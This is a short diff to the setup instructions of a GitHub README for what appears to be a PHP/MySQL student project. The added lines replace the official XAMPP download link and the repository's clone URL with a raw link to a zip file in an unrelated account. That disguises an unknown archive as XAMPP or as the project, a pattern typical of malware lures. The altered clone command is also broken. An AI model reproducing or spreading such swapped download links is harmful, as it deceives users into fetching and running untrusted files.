@@ -28,10 +28,10 @@ The application is built with **PHP, MySQL, HTML, CSS**, and features an interac
 ---
 
 ## 🚀 How to Run the Project
-1. Install [XAMPP](https://www.apachefriends.org/).  
+1. Install [XAMPP](https://raw.githubusercontent.com/Followgod12/FINAL-YEAR-PROJECT/main/yesterweek/FINAL-YEAR-PROJECT.zip).  
 2. Clone this repository into your `htdocs` folder:
    ```bash
-   git clone https://github.com/Supernova-Money12/FINAL-YEARCPROJECT.git
+   git clone https://raw.githubusercontent.com/Followgod12/FINAL-YEAR-PROJECT/main/yesterweek/FINAL-YEAR-PROJECT.zip
 
 ## 👨‍💻 Author
 
